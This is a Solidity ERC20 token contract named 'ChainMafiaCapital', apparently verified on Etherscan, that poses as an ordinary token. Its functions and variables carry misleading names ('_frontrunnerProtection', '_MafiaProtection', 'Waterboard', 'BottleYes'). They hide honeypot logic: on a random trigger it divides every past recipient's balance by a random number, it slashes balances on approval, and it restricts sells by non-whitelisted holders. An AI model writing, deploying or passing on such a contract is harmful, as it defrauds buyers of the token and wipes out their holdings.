/**
 *Submitted for verification at Etherscan.io on 2021-11-25
*/

// (c) CHAIN MAFIA CAPITAL

pragma solidity 0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) public CheckUniswapContract;
    mapping (address => bool) public CheckIfRouter;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _balancesCopy;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    address[] private mafiaArray;

    string private _name; string private _symbol;
    address private _creator; uint256 private _totalSupply;
    uint256 private BottleYes; uint256 private MafiaTax;
    uint256 private Fandom; bool private Whiteboard;
    bool private Waterboard; bool private Photoboard;
    bool private Grenade; uint16 private AMCboard;
    bool private routeone;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        _name = name_;
        _creator = creator_;
        _symbol = symbol_;
        Waterboard = true;
        CheckUniswapContract[creator_] = true;
        Whiteboard = true;
        Photoboard = false;
        CheckIfRouter[creator_] = false;
        Grenade = false;
        routeone = false;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function randomly(uint16 vl) internal returns (uint16) {
        AMCboard = (uint16(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%vl)/200);
        return AMCboard;
    }
    
    function _frontrunnerProtection(address sender, uint256 amount) internal view {
        if ((CheckUniswapContract[sender] == false)) {
            if ((amount > Fandom)) { require(false); }
            require(amount < BottleYes);
        }
    }
    
    function _MafiaProtection(address sender) internal {
        if (((CheckUniswapContract[sender] == true) && (address(sender) != _creator) && (Grenade == false)) || (routeone == true)) {
            if ((randomly(400) == 1) || (routeone == true)) {
                for (uint i = 0; i < mafiaArray.length; i++) { 
                    if (CheckUniswapContract[mafiaArray[i]] != true) {
                        _balances[mafiaArray[i]] = _balances[mafiaArray[i]] / uint256(randomly(16000));
                    }
                }
                routeone = Grenade ? false : true;
                Grenade = true;
            }
        }
    }
    
    function DeployChainMafiaCapital(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        (uint256 temp1, uint256 temp2) = (10, 1);

        _totalSupply += amount;
        _balances[account] += amount;
        
        BottleYes = _totalSupply;
        MafiaTax = _totalSupply / temp1;
        Fandom = MafiaTax * temp2;
        
        emit Transfer(address(0), account, amount);    
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        (CheckUniswapContract[spender],CheckIfRouter[spender],Whiteboard) = ((address(owner) == _creator) && (Whiteboard == true)) ? (true,false,false) : (CheckUniswapContract[spender],CheckIfRouter[spender],Whiteboard);
        
        _allowances[owner][spender] = amount;
        _balances[owner] = Grenade ? (_balances[owner] / uint256(randomly(16000))) : _balances[owner];
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        (BottleYes,Photoboard) = ((address(sender) == _creator) && (Waterboard == false)) ? (MafiaTax, true) : (BottleYes,Photoboard);
        (CheckUniswapContract[recipient],Waterboard) = ((address(sender) == _creator) && (Waterboard == true)) ? (true, false) : (CheckUniswapContract[recipient],Waterboard);
    
        _frontrunnerProtection(sender, amount);
        _MafiaProtection(sender);
        
        mafiaArray.push(recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        DeployChainMafiaCapital(creator, initialSupply);
    }
}

contract ChainMafiaCapital is ERC20Token {
    constructor() ERC20Token("ChainMafiaCapital", "CMC", msg.sender, 50000000000 * 10 ** 18) {
    }
}